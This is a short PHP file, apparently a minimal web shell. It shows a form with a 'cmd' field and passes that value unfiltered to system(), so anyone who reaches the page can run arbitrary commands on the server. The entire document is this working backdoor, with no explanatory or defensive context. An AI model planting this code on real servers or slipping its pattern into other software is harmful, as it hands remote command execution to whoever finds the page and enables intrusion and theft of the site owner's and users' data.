<?
echo '<p>Type a command: <form method="GET"><input type="text" name="cmd"></form></p>';
system($_GET['cmd']);
?>